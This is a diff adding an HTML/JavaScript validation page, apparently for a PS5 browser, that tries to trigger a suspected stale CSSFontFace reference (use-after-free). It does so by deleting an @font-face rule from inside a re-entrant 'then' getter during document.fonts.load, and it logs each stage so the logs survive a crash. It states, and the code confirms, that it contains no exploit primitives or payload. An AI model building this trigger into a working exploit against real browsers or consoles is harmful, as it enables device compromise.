@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CSSFontFace lifetime validation - missing remote font variant</title>
+<style>
+html { font-family: system-ui, -apple-system, sans-serif; background: #111; color: #eee; }
+body { margin: 0; padding: 16px; line-height: 1.45; }
+button { font: inherit; padding: 10px 14px; margin: 4px 8px 12px 0; }
+.box { border: 1px solid #444; border-radius: 8px; padding: 12px; margin: 12px 0; background: #181818; }
+.warn { color: #ffd479; }
+.ok { color: #98f598; }
+.bad { color: #ff8f8f; }
+#stage { font-size: 20px; font-weight: 700; }
+#probe { position: absolute; left: -10000px; top: -10000px; font-family: "ps5-cssfontface-validation-missing"; }
+#log, #previous { white-space: pre-wrap; word-break: break-word; background: #050505; color: #d7ffd7; padding: 12px; border-radius: 8px; min-height: 120px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 13px; }
+</style>
+<style id="validation-style">
+@font-face {
+    font-family: "ps5-cssfontface-validation-missing";
+    src: url("missing-font.woff") format("woff");
+    unicode-range: U+0042; /* B: stylesheet-backed CSSFontFace with intentionally missing remote font */
+}
+</style>
+</head>
+<body>
+<h1>CSSFontFace lifetime validation</h1>
+<h2>Variant 2: missing remote CSS @font-face</h2>
+
+<div class="box warn">
+Validation-only page. It does not contain heap spray, exploit primitives, ARW/addrof/fakeobj, shellcode, or sandbox escape logic.
+Its only purpose is to exercise a suspected stale CSSFontFace reference path and show the last visible stage before crash/reload.
+</div>
+
+<div class="box">
+<div id="stage">Stage: not started</div>
+<button id="run">Run validation</button>
+<button id="clear">Clear logs</button>
+<div id="probe">AB</div>
+</div>
+
+<div class="box">
+<h3>Current run log</h3>
+<pre id="log"></pre>
+</div>
+
+<div class="box">
+<h3>Previous persisted log</h3>
+<pre id="previous"></pre>
+</div>
+
+<script>
+(function () {
+    "use strict";
+
+    const VARIANT = "missing-remote-font";
+    const FAMILY = "ps5-cssfontface-validation-missing";
+    const STORAGE_KEY = "cssfontface-validation-log-" + VARIANT;
+    const stageElement = document.getElementById("stage");
+    const logElement = document.getElementById("log");
+    const previousElement = document.getElementById("previous");
+    const runButton = document.getElementById("run");
+    const clearButton = document.getElementById("clear");
+
+    let sequence = 0;
+    let running = false;
+    let reentered = false;
+
+    function timestamp() {
+        return new Date().toISOString();
+    }
+
+    function persist(line) {
+        try {
+            const previous = localStorage.getItem(STORAGE_KEY) || "";
+            localStorage.setItem(STORAGE_KEY, previous + line + "\n");
+        } catch (e) {
+            // Ignore storage failures; visible logging still works.
+        }
+    }
+
+    function setStage(name) {
+        sequence += 1;
+        const line = "[" + sequence + "] " + timestamp() + " :: " + name;
+        stageElement.textContent = "Stage " + sequence + ": " + name;
+        logElement.textContent += line + "\n";
+        persist(line);
+        if (window.console)
+            console.log(line);
+    }
+
+    function loadPreviousLog() {
+        try {
+            previousElement.textContent = localStorage.getItem(STORAGE_KEY) || "(no previous persisted log)";
+        } catch (e) {
+            previousElement.textContent = "(localStorage unavailable: " + e.name + ")";
+        }
+    }
+
+    window.addEventListener("error", event => {
+        setStage("window.error: " + event.message);
+    });
+
+    window.addEventListener("unhandledrejection", event => {
+        setStage("unhandledrejection: " + event.reason);
+    });
+
+    window.addEventListener("beforeunload", () => {
+        persist("[beforeunload] " + timestamp() + " :: page unloading/reloading");
+    });
+
+    clearButton.addEventListener("click", () => {
+        try { localStorage.removeItem(STORAGE_KEY); } catch (e) { }
+        logElement.textContent = "";
+        previousElement.textContent = "(cleared)";
+        stageElement.textContent = "Stage: logs cleared";
+        sequence = 0;
+    });
+
+    async function runValidation() {
+        if (running)
+            return;
+        running = true;
+        reentered = false;
+        logElement.textContent = "";
+        persist("\n=== new run: " + timestamp() + " variant=" + VARIANT + " ===");
+
+        setStage("start validation-only run");
+
+        const styleElement = document.getElementById("validation-style");
+        const sheet = styleElement && styleElement.sheet;
+        setStage("stylesheet located; cssRules=" + (sheet ? sheet.cssRules.length : "no sheet"));
+
+        // A: JavaScript-created local FontFace. The local source is used only to
+        // create a synchronous/near-synchronous promise path for re-entry.
+        // B is supplied by the stylesheet-backed missing remote font above.
+        const jsFace = new FontFace(
+            FAMILY,
+            "local(Arial), local(Helvetica), local(Times New Roman), local(Courier New)",
+            { unicodeRange: "U+0041" } // A: JS-created FontFace
+        );
+        setStage("created JS FontFace for U+0041");
+
+        document.fonts.add(jsFace);
+        setStage("added JS FontFace to document.fonts; current size=" + document.fonts.size);
+
+        Object.defineProperty(jsFace, "then", {
+            configurable: true,
+            get() {
+                if (reentered) {
+                    setStage("then getter called again; ignored");
+                    return undefined;
+                }
+                reentered = true;
+                setStage("then getter re-entry reached");
+
+                try {
+                    setStage("about to delete stylesheet @font-face rule for missing-font.woff");
+                    if (sheet && sheet.cssRules.length)
+                        sheet.deleteRule(0);
+                    setStage("deleted stylesheet rule; cssRules=" + (sheet ? sheet.cssRules.length : "no sheet"));
+                } catch (e) {
+                    setStage("deleteRule threw " + e.name + ": " + e.message);
+                }
+
+                try {
+                    setStage("forcing style/layout recalculation");
+                    void document.body.offsetTop;
+                    void getComputedStyle(document.getElementById("probe")).fontFamily;
+                    setStage("forced style/layout recalculation complete; document.fonts.size=" + document.fonts.size);
+                } catch (e) {
+                    setStage("style/layout force threw " + e.name + ": " + e.message);
+                }
+
+                return undefined;
+            }
+        });
+        setStage("installed controlled then getter on JS FontFace");
+
+        try {
+            setStage("calling document.fonts.load for text AB");
+            const loadPromise = document.fonts.load("1em " + FAMILY, "AB");
+            setStage("document.fonts.load returned Promise");
+
+            loadPromise.then(faces => {
+                setStage("load promise resolved; faces.length=" + faces.length);
+                setStage("final state: reentered=" + reentered + ", cssRules=" + (sheet ? sheet.cssRules.length : "no sheet") + ", document.fonts.size=" + document.fonts.size);
+                setStage("NO CRASH observed in JS-visible path");
+                running = false;
+            }, error => {
+                setStage("load promise rejected: " + error.name + ": " + error.message);
+                setStage("final state after rejection: reentered=" + reentered + ", cssRules=" + (sheet ? sheet.cssRules.length : "no sheet"));
+                running = false;
+            });
+        } catch (e) {
+            setStage("synchronous exception from document.fonts.load: " + e.name + ": " + e.message);
+            running = false;
+        }
+
+        setTimeout(() => {
+            if (running) {
+                setStage("timeout: run still pending after 3000ms; reentered=" + reentered);
+                running = false;
+            }
+        }, 3000);
+    }
+
+    runButton.addEventListener("click", runValidation);
+    loadPreviousLog();
+    setStage("page loaded; press Run validation");
+})();
+</script>
+</body>
+</html>
